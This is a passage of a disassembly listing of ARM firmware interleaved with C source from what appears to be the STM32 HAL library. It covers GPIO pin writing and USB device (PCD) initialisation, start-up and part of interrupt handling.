 8001c08:	d003      	beq.n	8001c12 <HAL_GPIO_Init+0x296>
        {
          temp |= iocurrent;
 8001c0a:	693a      	ldr	r2, [r7, #16]
 8001c0c:	68fb      	ldr	r3, [r7, #12]
 8001c0e:	4313      	orrs	r3, r2
 8001c10:	613b      	str	r3, [r7, #16]
        }
        EXTI->IMR1 = temp;
 8001c12:	4a0e      	ldr	r2, [pc, #56]	; (8001c4c <HAL_GPIO_Init+0x2d0>)
 8001c14:	693b      	ldr	r3, [r7, #16]
 8001c16:	6013      	str	r3, [r2, #0]
      }
    }

    position++;
 8001c18:	697b      	ldr	r3, [r7, #20]
 8001c1a:	3301      	adds	r3, #1
 8001c1c:	617b      	str	r3, [r7, #20]
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001c1e:	683b      	ldr	r3, [r7, #0]
 8001c20:	681a      	ldr	r2, [r3, #0]
 8001c22:	697b      	ldr	r3, [r7, #20]
 8001c24:	fa22 f303 	lsr.w	r3, r2, r3
 8001c28:	2b00      	cmp	r3, #0
 8001c2a:	f47f aeaf 	bne.w	800198c <HAL_GPIO_Init+0x10>
  }
}
 8001c2e:	bf00      	nop
 8001c30:	bf00      	nop
 8001c32:	371c      	adds	r7, #28
 8001c34:	46bd      	mov	sp, r7
 8001c36:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001c3a:	4770      	bx	lr
 8001c3c:	40021000 	.word	0x40021000
 8001c40:	40010000 	.word	0x40010000
 8001c44:	48000400 	.word	0x48000400
 8001c48:	48000800 	.word	0x48000800
 8001c4c:	40010400 	.word	0x40010400

08001c50 <HAL_GPIO_WritePin>:
  *            @arg GPIO_PIN_RESET: to clear the port pin
  *            @arg GPIO_PIN_SET: to set the port pin
  * @retval None
  */
void HAL_GPIO_WritePin(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin, GPIO_PinState PinState)
{
 8001c50:	b480      	push	{r7}
 8001c52:	b083      	sub	sp, #12
 8001c54:	af00      	add	r7, sp, #0
 8001c56:	6078      	str	r0, [r7, #4]
 8001c58:	460b      	mov	r3, r1
 8001c5a:	807b      	strh	r3, [r7, #2]
 8001c5c:	4613      	mov	r3, r2
 8001c5e:	707b      	strb	r3, [r7, #1]
  /* Check the parameters */
  assert_param(IS_GPIO_PIN(GPIO_Pin));
  assert_param(IS_GPIO_PIN_ACTION(PinState));

  if(PinState != GPIO_PIN_RESET)
 8001c60:	787b      	ldrb	r3, [r7, #1]
 8001c62:	2b00      	cmp	r3, #0
 8001c64:	d003      	beq.n	8001c6e <HAL_GPIO_WritePin+0x1e>
  {
    GPIOx->BSRR = (uint32_t)GPIO_Pin;
 8001c66:	887a      	ldrh	r2, [r7, #2]
 8001c68:	687b      	ldr	r3, [r7, #4]
 8001c6a:	619a      	str	r2, [r3, #24]
  }
  else
  {
    GPIOx->BRR = (uint32_t)GPIO_Pin;
  }
}
 8001c6c:	e002      	b.n	8001c74 <HAL_GPIO_WritePin+0x24>
    GPIOx->BRR = (uint32_t)GPIO_Pin;
 8001c6e:	887a      	ldrh	r2, [r7, #2]
 8001c70:	687b      	ldr	r3, [r7, #4]
 8001c72:	629a      	str	r2, [r3, #40]	; 0x28
}
 8001c74:	bf00      	nop
 8001c76:	370c      	adds	r7, #12
 8001c78:	46bd      	mov	sp, r7
 8001c7a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001c7e:	4770      	bx	lr

08001c80 <HAL_PCD_Init>:
  *         parameters in the PCD_InitTypeDef and initialize the associated handle.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Init(PCD_HandleTypeDef *hpcd)
{
 8001c80:	b5f0      	push	{r4, r5, r6, r7, lr}
 8001c82:	b08b      	sub	sp, #44	; 0x2c
 8001c84:	af06      	add	r7, sp, #24
 8001c86:	6078      	str	r0, [r7, #4]
  USB_OTG_GlobalTypeDef *USBx;
#endif /* defined (USB_OTG_FS) */
  uint8_t i;

  /* Check the PCD handle allocation */
  if (hpcd == NULL)
 8001c88:	687b      	ldr	r3, [r7, #4]
 8001c8a:	2b00      	cmp	r3, #0
 8001c8c:	d101      	bne.n	8001c92 <HAL_PCD_Init+0x12>
  {
    return HAL_ERROR;
 8001c8e:	2301      	movs	r3, #1
 8001c90:	e0f8      	b.n	8001e84 <HAL_PCD_Init+0x204>

#if defined (USB_OTG_FS)
  USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  if (hpcd->State == HAL_PCD_STATE_RESET)
 8001c92:	687b      	ldr	r3, [r7, #4]
 8001c94:	f893 32a9 	ldrb.w	r3, [r3, #681]	; 0x2a9
 8001c98:	b2db      	uxtb	r3, r3
 8001c9a:	2b00      	cmp	r3, #0
 8001c9c:	d106      	bne.n	8001cac <HAL_PCD_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    hpcd->Lock = HAL_UNLOCKED;
 8001c9e:	687b      	ldr	r3, [r7, #4]
 8001ca0:	2200      	movs	r2, #0
 8001ca2:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

    /* Init the low level hardware */
    hpcd->MspInitCallback(hpcd);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_PCD_MspInit(hpcd);
 8001ca6:	6878      	ldr	r0, [r7, #4]
 8001ca8:	f00a fde4 	bl	800c874 <HAL_PCD_MspInit>
#endif /* (USE_HAL_PCD_REGISTER_CALLBACKS) */
  }

  hpcd->State = HAL_PCD_STATE_BUSY;
 8001cac:	687b      	ldr	r3, [r7, #4]
 8001cae:	2203      	movs	r2, #3
 8001cb0:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    hpcd->Init.dma_enable = 0U;
  }
#endif /* defined (USB_OTG_FS) */

  /* Disable the Interrupts */
  __HAL_PCD_DISABLE(hpcd);
 8001cb4:	687b      	ldr	r3, [r7, #4]
 8001cb6:	681b      	ldr	r3, [r3, #0]
 8001cb8:	4618      	mov	r0, r3
 8001cba:	f004 f8d4 	bl	8005e66 <USB_DisableGlobalInt>

  /*Init the Core (common init.) */
  if (USB_CoreInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001cbe:	687b      	ldr	r3, [r7, #4]
 8001cc0:	681b      	ldr	r3, [r3, #0]
 8001cc2:	603b      	str	r3, [r7, #0]
 8001cc4:	687e      	ldr	r6, [r7, #4]
 8001cc6:	466d      	mov	r5, sp
 8001cc8:	f106 0410 	add.w	r4, r6, #16
 8001ccc:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001cce:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001cd0:	6823      	ldr	r3, [r4, #0]
 8001cd2:	602b      	str	r3, [r5, #0]
 8001cd4:	1d33      	adds	r3, r6, #4
 8001cd6:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001cd8:	6838      	ldr	r0, [r7, #0]
 8001cda:	f004 f89c 	bl	8005e16 <USB_CoreInit>
 8001cde:	4603      	mov	r3, r0
 8001ce0:	2b00      	cmp	r3, #0
 8001ce2:	d005      	beq.n	8001cf0 <HAL_PCD_Init+0x70>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001ce4:	687b      	ldr	r3, [r7, #4]
 8001ce6:	2202      	movs	r2, #2
 8001ce8:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001cec:	2301      	movs	r3, #1
 8001cee:	e0c9      	b.n	8001e84 <HAL_PCD_Init+0x204>
  }

  /* Force Device Mode*/
  (void)USB_SetCurrentMode(hpcd->Instance, USB_DEVICE_MODE);
 8001cf0:	687b      	ldr	r3, [r7, #4]
 8001cf2:	681b      	ldr	r3, [r3, #0]
 8001cf4:	2100      	movs	r1, #0
 8001cf6:	4618      	mov	r0, r3
 8001cf8:	f004 f8d0 	bl	8005e9c <USB_SetCurrentMode>

  /* Init endpoints structures */
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001cfc:	2300      	movs	r3, #0
 8001cfe:	73fb      	strb	r3, [r7, #15]
 8001d00:	e040      	b.n	8001d84 <HAL_PCD_Init+0x104>
  {
    /* Init ep structure */
    hpcd->IN_ep[i].is_in = 1U;
 8001d02:	7bfb      	ldrb	r3, [r7, #15]
 8001d04:	6879      	ldr	r1, [r7, #4]
 8001d06:	1c5a      	adds	r2, r3, #1
 8001d08:	4613      	mov	r3, r2
 8001d0a:	009b      	lsls	r3, r3, #2
 8001d0c:	4413      	add	r3, r2
 8001d0e:	00db      	lsls	r3, r3, #3
 8001d10:	440b      	add	r3, r1
 8001d12:	3301      	adds	r3, #1
 8001d14:	2201      	movs	r2, #1
 8001d16:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].num = i;
 8001d18:	7bfb      	ldrb	r3, [r7, #15]
 8001d1a:	6879      	ldr	r1, [r7, #4]
 8001d1c:	1c5a      	adds	r2, r3, #1
 8001d1e:	4613      	mov	r3, r2
 8001d20:	009b      	lsls	r3, r3, #2
 8001d22:	4413      	add	r3, r2
 8001d24:	00db      	lsls	r3, r3, #3
 8001d26:	440b      	add	r3, r1
 8001d28:	7bfa      	ldrb	r2, [r7, #15]
 8001d2a:	701a      	strb	r2, [r3, #0]
#if defined (USB_OTG_FS)
    hpcd->IN_ep[i].tx_fifo_num = i;
#endif /* defined (USB_OTG_FS) */
    /* Control until ep is activated */
    hpcd->IN_ep[i].type = EP_TYPE_CTRL;
 8001d2c:	7bfb      	ldrb	r3, [r7, #15]
 8001d2e:	6879      	ldr	r1, [r7, #4]
 8001d30:	1c5a      	adds	r2, r3, #1
 8001d32:	4613      	mov	r3, r2
 8001d34:	009b      	lsls	r3, r3, #2
 8001d36:	4413      	add	r3, r2
 8001d38:	00db      	lsls	r3, r3, #3
 8001d3a:	440b      	add	r3, r1
 8001d3c:	3303      	adds	r3, #3
 8001d3e:	2200      	movs	r2, #0
 8001d40:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].maxpacket = 0U;
 8001d42:	7bfa      	ldrb	r2, [r7, #15]
 8001d44:	6879      	ldr	r1, [r7, #4]
 8001d46:	4613      	mov	r3, r2
 8001d48:	009b      	lsls	r3, r3, #2
 8001d4a:	4413      	add	r3, r2
 8001d4c:	00db      	lsls	r3, r3, #3
 8001d4e:	440b      	add	r3, r1
 8001d50:	3338      	adds	r3, #56	; 0x38
 8001d52:	2200      	movs	r2, #0
 8001d54:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_buff = 0U;
 8001d56:	7bfa      	ldrb	r2, [r7, #15]
 8001d58:	6879      	ldr	r1, [r7, #4]
 8001d5a:	4613      	mov	r3, r2
 8001d5c:	009b      	lsls	r3, r3, #2
 8001d5e:	4413      	add	r3, r2
 8001d60:	00db      	lsls	r3, r3, #3
 8001d62:	440b      	add	r3, r1
 8001d64:	333c      	adds	r3, #60	; 0x3c
 8001d66:	2200      	movs	r2, #0
 8001d68:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_len = 0U;
 8001d6a:	7bfa      	ldrb	r2, [r7, #15]
 8001d6c:	6879      	ldr	r1, [r7, #4]
 8001d6e:	4613      	mov	r3, r2
 8001d70:	009b      	lsls	r3, r3, #2
 8001d72:	4413      	add	r3, r2
 8001d74:	00db      	lsls	r3, r3, #3
 8001d76:	440b      	add	r3, r1
 8001d78:	3340      	adds	r3, #64	; 0x40
 8001d7a:	2200      	movs	r2, #0
 8001d7c:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001d7e:	7bfb      	ldrb	r3, [r7, #15]
 8001d80:	3301      	adds	r3, #1
 8001d82:	73fb      	strb	r3, [r7, #15]
 8001d84:	7bfa      	ldrb	r2, [r7, #15]
 8001d86:	687b      	ldr	r3, [r7, #4]
 8001d88:	685b      	ldr	r3, [r3, #4]
 8001d8a:	429a      	cmp	r2, r3
 8001d8c:	d3b9      	bcc.n	8001d02 <HAL_PCD_Init+0x82>
  }

  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001d8e:	2300      	movs	r3, #0
 8001d90:	73fb      	strb	r3, [r7, #15]
 8001d92:	e044      	b.n	8001e1e <HAL_PCD_Init+0x19e>
  {
    hpcd->OUT_ep[i].is_in = 0U;
 8001d94:	7bfa      	ldrb	r2, [r7, #15]
 8001d96:	6879      	ldr	r1, [r7, #4]
 8001d98:	4613      	mov	r3, r2
 8001d9a:	009b      	lsls	r3, r3, #2
 8001d9c:	4413      	add	r3, r2
 8001d9e:	00db      	lsls	r3, r3, #3
 8001da0:	440b      	add	r3, r1
 8001da2:	f203 1369 	addw	r3, r3, #361	; 0x169
 8001da6:	2200      	movs	r2, #0
 8001da8:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].num = i;
 8001daa:	7bfa      	ldrb	r2, [r7, #15]
 8001dac:	6879      	ldr	r1, [r7, #4]
 8001dae:	4613      	mov	r3, r2
 8001db0:	009b      	lsls	r3, r3, #2
 8001db2:	4413      	add	r3, r2
 8001db4:	00db      	lsls	r3, r3, #3
 8001db6:	440b      	add	r3, r1
 8001db8:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8001dbc:	7bfa      	ldrb	r2, [r7, #15]
 8001dbe:	701a      	strb	r2, [r3, #0]
    /* Control until ep is activated */
    hpcd->OUT_ep[i].type = EP_TYPE_CTRL;
 8001dc0:	7bfa      	ldrb	r2, [r7, #15]
 8001dc2:	6879      	ldr	r1, [r7, #4]
 8001dc4:	4613      	mov	r3, r2
 8001dc6:	009b      	lsls	r3, r3, #2
 8001dc8:	4413      	add	r3, r2
 8001dca:	00db      	lsls	r3, r3, #3
 8001dcc:	440b      	add	r3, r1
 8001dce:	f203 136b 	addw	r3, r3, #363	; 0x16b
 8001dd2:	2200      	movs	r2, #0
 8001dd4:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].maxpacket = 0U;
 8001dd6:	7bfa      	ldrb	r2, [r7, #15]
 8001dd8:	6879      	ldr	r1, [r7, #4]
 8001dda:	4613      	mov	r3, r2
 8001ddc:	009b      	lsls	r3, r3, #2
 8001dde:	4413      	add	r3, r2
 8001de0:	00db      	lsls	r3, r3, #3
 8001de2:	440b      	add	r3, r1
 8001de4:	f503 73bc 	add.w	r3, r3, #376	; 0x178
 8001de8:	2200      	movs	r2, #0
 8001dea:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_buff = 0U;
 8001dec:	7bfa      	ldrb	r2, [r7, #15]
 8001dee:	6879      	ldr	r1, [r7, #4]
 8001df0:	4613      	mov	r3, r2
 8001df2:	009b      	lsls	r3, r3, #2
 8001df4:	4413      	add	r3, r2
 8001df6:	00db      	lsls	r3, r3, #3
 8001df8:	440b      	add	r3, r1
 8001dfa:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 8001dfe:	2200      	movs	r2, #0
 8001e00:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_len = 0U;
 8001e02:	7bfa      	ldrb	r2, [r7, #15]
 8001e04:	6879      	ldr	r1, [r7, #4]
 8001e06:	4613      	mov	r3, r2
 8001e08:	009b      	lsls	r3, r3, #2
 8001e0a:	4413      	add	r3, r2
 8001e0c:	00db      	lsls	r3, r3, #3
 8001e0e:	440b      	add	r3, r1
 8001e10:	f503 73c0 	add.w	r3, r3, #384	; 0x180
 8001e14:	2200      	movs	r2, #0
 8001e16:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001e18:	7bfb      	ldrb	r3, [r7, #15]
 8001e1a:	3301      	adds	r3, #1
 8001e1c:	73fb      	strb	r3, [r7, #15]
 8001e1e:	7bfa      	ldrb	r2, [r7, #15]
 8001e20:	687b      	ldr	r3, [r7, #4]
 8001e22:	685b      	ldr	r3, [r3, #4]
 8001e24:	429a      	cmp	r2, r3
 8001e26:	d3b5      	bcc.n	8001d94 <HAL_PCD_Init+0x114>
  }

  /* Init Device */
  if (USB_DevInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001e28:	687b      	ldr	r3, [r7, #4]
 8001e2a:	681b      	ldr	r3, [r3, #0]
 8001e2c:	603b      	str	r3, [r7, #0]
 8001e2e:	687e      	ldr	r6, [r7, #4]
 8001e30:	466d      	mov	r5, sp
 8001e32:	f106 0410 	add.w	r4, r6, #16
 8001e36:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001e38:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001e3a:	6823      	ldr	r3, [r4, #0]
 8001e3c:	602b      	str	r3, [r5, #0]
 8001e3e:	1d33      	adds	r3, r6, #4
 8001e40:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001e42:	6838      	ldr	r0, [r7, #0]
 8001e44:	f004 f837 	bl	8005eb6 <USB_DevInit>
 8001e48:	4603      	mov	r3, r0
 8001e4a:	2b00      	cmp	r3, #0
 8001e4c:	d005      	beq.n	8001e5a <HAL_PCD_Init+0x1da>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001e4e:	687b      	ldr	r3, [r7, #4]
 8001e50:	2202      	movs	r2, #2
 8001e52:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001e56:	2301      	movs	r3, #1
 8001e58:	e014      	b.n	8001e84 <HAL_PCD_Init+0x204>
  }

  hpcd->USB_Address = 0U;
 8001e5a:	687b      	ldr	r3, [r7, #4]
 8001e5c:	2200      	movs	r2, #0
 8001e5e:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  hpcd->State = HAL_PCD_STATE_READY;
 8001e62:	687b      	ldr	r3, [r7, #4]
 8001e64:	2201      	movs	r2, #1
 8001e66:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9

  /* Activate LPM */
  if (hpcd->Init.lpm_enable == 1U)
 8001e6a:	687b      	ldr	r3, [r7, #4]
 8001e6c:	69db      	ldr	r3, [r3, #28]
 8001e6e:	2b01      	cmp	r3, #1
 8001e70:	d102      	bne.n	8001e78 <HAL_PCD_Init+0x1f8>
  {
    (void)HAL_PCDEx_ActivateLPM(hpcd);
 8001e72:	6878      	ldr	r0, [r7, #4]
 8001e74:	f001 fc9e 	bl	80037b4 <HAL_PCDEx_ActivateLPM>
  }

  (void)USB_DevDisconnect(hpcd->Instance);
 8001e78:	687b      	ldr	r3, [r7, #4]
 8001e7a:	681b      	ldr	r3, [r3, #0]
 8001e7c:	4618      	mov	r0, r3
 8001e7e:	f006 fadf 	bl	8008440 <USB_DevDisconnect>

  return HAL_OK;
 8001e82:	2300      	movs	r3, #0
}
 8001e84:	4618      	mov	r0, r3
 8001e86:	3714      	adds	r7, #20
 8001e88:	46bd      	mov	sp, r7
 8001e8a:	bdf0      	pop	{r4, r5, r6, r7, pc}

08001e8c <HAL_PCD_Start>:
  * @brief  Start the USB device
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Start(PCD_HandleTypeDef *hpcd)
{
 8001e8c:	b580      	push	{r7, lr}
 8001e8e:	b082      	sub	sp, #8
 8001e90:	af00      	add	r7, sp, #0
 8001e92:	6078      	str	r0, [r7, #4]
#if defined (USB_OTG_FS)
  USB_OTG_GlobalTypeDef *USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  __HAL_LOCK(hpcd);
 8001e94:	687b      	ldr	r3, [r7, #4]
 8001e96:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8001e9a:	2b01      	cmp	r3, #1
 8001e9c:	d101      	bne.n	8001ea2 <HAL_PCD_Start+0x16>
 8001e9e:	2302      	movs	r3, #2
 8001ea0:	e012      	b.n	8001ec8 <HAL_PCD_Start+0x3c>
 8001ea2:	687b      	ldr	r3, [r7, #4]
 8001ea4:	2201      	movs	r2, #1
 8001ea6:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  {
    /* Enable USB Transceiver */
    USBx->GCCFG |= USB_OTG_GCCFG_PWRDWN;
  }
#endif /* defined (USB_OTG_FS) */
  __HAL_PCD_ENABLE(hpcd);
 8001eaa:	687b      	ldr	r3, [r7, #4]
 8001eac:	681b      	ldr	r3, [r3, #0]
 8001eae:	4618      	mov	r0, r3
 8001eb0:	f003 ffc2 	bl	8005e38 <USB_EnableGlobalInt>
  (void)USB_DevConnect(hpcd->Instance);
 8001eb4:	687b      	ldr	r3, [r7, #4]
 8001eb6:	681b      	ldr	r3, [r3, #0]
 8001eb8:	4618      	mov	r0, r3
 8001eba:	f006 faaa 	bl	8008412 <USB_DevConnect>
  __HAL_UNLOCK(hpcd);
 8001ebe:	687b      	ldr	r3, [r7, #4]
 8001ec0:	2200      	movs	r2, #0
 8001ec2:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8001ec6:	2300      	movs	r3, #0
}
 8001ec8:	4618      	mov	r0, r3
 8001eca:	3708      	adds	r7, #8
 8001ecc:	46bd      	mov	sp, r7
 8001ece:	bd80      	pop	{r7, pc}

08001ed0 <HAL_PCD_IRQHandler>:
  * @brief  This function handles PCD interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
void HAL_PCD_IRQHandler(PCD_HandleTypeDef *hpcd)
{
 8001ed0:	b580      	push	{r7, lr}
 8001ed2:	b084      	sub	sp, #16
 8001ed4:	af00      	add	r7, sp, #0
 8001ed6:	6078      	str	r0, [r7, #4]
  uint32_t wIstr = USB_ReadInterrupts(hpcd->Instance);
 8001ed8:	687b      	ldr	r3, [r7, #4]
 8001eda:	681b      	ldr	r3, [r3, #0]
 8001edc:	4618      	mov	r0, r3
 8001ede:	f006 fac4 	bl	800846a <USB_ReadInterrupts>
 8001ee2:	60f8      	str	r0, [r7, #12]

  if ((wIstr & USB_ISTR_CTR) == USB_ISTR_CTR)
 8001ee4:	68fb      	ldr	r3, [r7, #12]
 8001ee6:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8001eea:	2b00      	cmp	r3, #0
 8001eec:	d003      	beq.n	8001ef6 <HAL_PCD_IRQHandler+0x26>
  {
    /* servicing of the endpoint correct transfer interrupt */
    /* clear of the CTR flag into the sub */
    (void)PCD_EP_ISR_Handler(hpcd);
 8001eee:	6878      	ldr	r0, [r7, #4]
 8001ef0:	f000 fb59 	bl	80025a6 <PCD_EP_ISR_Handler>

    return;
 8001ef4:	e110      	b.n	8002118 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_RESET) == USB_ISTR_RESET)
 8001ef6:	68fb      	ldr	r3, [r7, #12]
 8001ef8:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001efc:	2b00      	cmp	r3, #0
 8001efe:	d013      	beq.n	8001f28 <HAL_PCD_IRQHandler+0x58>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_RESET);
 8001f00:	687b      	ldr	r3, [r7, #4]
 8001f02:	681b      	ldr	r3, [r3, #0]
 8001f04:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001f08:	b29a      	uxth	r2, r3
 8001f0a:	687b      	ldr	r3, [r7, #4]
 8001f0c:	681b      	ldr	r3, [r3, #0]
 8001f0e:	f422 6280 	bic.w	r2, r2, #1024	; 0x400
 8001f12:	b292      	uxth	r2, r2
 8001f14:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResetCallback(hpcd);
#else
    HAL_PCD_ResetCallback(hpcd);
 8001f18:	6878      	ldr	r0, [r7, #4]
 8001f1a:	f00a fd4c 	bl	800c9b6 <HAL_PCD_ResetCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    (void)HAL_PCD_SetAddress(hpcd, 0U);
 8001f1e:	2100      	movs	r1, #0
 8001f20:	6878      	ldr	r0, [r7, #4]
 8001f22:	f000 f8fc 	bl	800211e <HAL_PCD_SetAddress>

    return;
 8001f26:	e0f7      	b.n	8002118 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_PMAOVR) == USB_ISTR_PMAOVR)
 8001f28:	68fb      	ldr	r3, [r7, #12]
 8001f2a:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8001f2e:	2b00      	cmp	r3, #0
 8001f30:	d00c      	beq.n	8001f4c <HAL_PCD_IRQHandler+0x7c>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_PMAOVR);
 8001f32:	687b      	ldr	r3, [r7, #4]
 8001f34:	681b      	ldr	r3, [r3, #0]
 8001f36:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001f3a:	b29a      	uxth	r2, r3
 8001f3c:	687b      	ldr	r3, [r7, #4]
 8001f3e:	681b      	ldr	r3, [r3, #0]
 8001f40:	f422 4280 	bic.w	r2, r2, #16384	; 0x4000
 8001f44:	b292      	uxth	r2, r2
 8001f46:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001f4a:	e0e5      	b.n	8002118 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ERR) == USB_ISTR_ERR)
 8001f4c:	68fb      	ldr	r3, [r7, #12]
 8001f4e:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8001f52:	2b00      	cmp	r3, #0
 8001f54:	d00c      	beq.n	8001f70 <HAL_PCD_IRQHandler+0xa0>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ERR);
 8001f56:	687b      	ldr	r3, [r7, #4]
 8001f58:	681b      	ldr	r3, [r3, #0]
 8001f5a:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001f5e:	b29a      	uxth	r2, r3
 8001f60:	687b      	ldr	r3, [r7, #4]
 8001f62:	681b      	ldr	r3, [r3, #0]
 8001f64:	f422 5200 	bic.w	r2, r2, #8192	; 0x2000
 8001f68:	b292      	uxth	r2, r2
 8001f6a:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001f6e:	e0d3      	b.n	8002118 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_WKUP) == USB_ISTR_WKUP)
 8001f70:	68fb      	ldr	r3, [r7, #12]
 8001f72:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8001f76:	2b00      	cmp	r3, #0
 8001f78:	d034      	beq.n	8001fe4 <HAL_PCD_IRQHandler+0x114>
  {
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_LPMODE);
 8001f7a:	687b      	ldr	r3, [r7, #4]
 8001f7c:	681b      	ldr	r3, [r3, #0]
 8001f7e:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f82:	b29a      	uxth	r2, r3
 8001f84:	687b      	ldr	r3, [r7, #4]
 8001f86:	681b      	ldr	r3, [r3, #0]
 8001f88:	f022 0204 	bic.w	r2, r2, #4
 8001f8c:	b292      	uxth	r2, r2
 8001f8e:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_FSUSP);
 8001f92:	687b      	ldr	r3, [r7, #4]
 8001f94:	681b      	ldr	r3, [r3, #0]
 8001f96:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f9a:	b29a      	uxth	r2, r3
 8001f9c:	687b      	ldr	r3, [r7, #4]
 8001f9e:	681b      	ldr	r3, [r3, #0]
 8001fa0:	f022 0208 	bic.w	r2, r2, #8
 8001fa4:	b292      	uxth	r2, r2
 8001fa6:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    if (hpcd->LPM_State == LPM_L1)
 8001faa:	687b      	ldr	r3, [r7, #4]
 8001fac:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8001fb0:	2b01      	cmp	r3, #1
 8001fb2:	d107      	bne.n	8001fc4 <HAL_PCD_IRQHandler+0xf4>
    {
      hpcd->LPM_State = LPM_L0;
 8001fb4:	687b      	ldr	r3, [r7, #4]
 8001fb6:	2200      	movs	r2, #0
 8001fb8:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L0_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L0_ACTIVE);
 8001fbc:	2100      	movs	r1, #0
 8001fbe:	6878      	ldr	r0, [r7, #4]
 8001fc0:	f00a ffd6 	bl	800cf70 <HAL_PCDEx_LPM_Callback>
    }

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResumeCallback(hpcd);
#else
    HAL_PCD_ResumeCallback(hpcd);
 8001fc4:	6878      	ldr	r0, [r7, #4]
 8001fc6:	f00a fd2f 	bl	800ca28 <HAL_PCD_ResumeCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_WKUP);
 8001fca:	687b      	ldr	r3, [r7, #4]
 8001fcc:	681b      	ldr	r3, [r3, #0]
 8001fce:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001fd2:	b29a      	uxth	r2, r3
 8001fd4:	687b      	ldr	r3, [r7, #4]
 8001fd6:	681b      	ldr	r3, [r3, #0]
 8001fd8:	f422 5280 	bic.w	r2, r2, #4096	; 0x1000
 8001fdc:	b292      	uxth	r2, r2
 8001fde:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001fe2:	e099      	b.n	8002118 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SUSP) == USB_ISTR_SUSP)
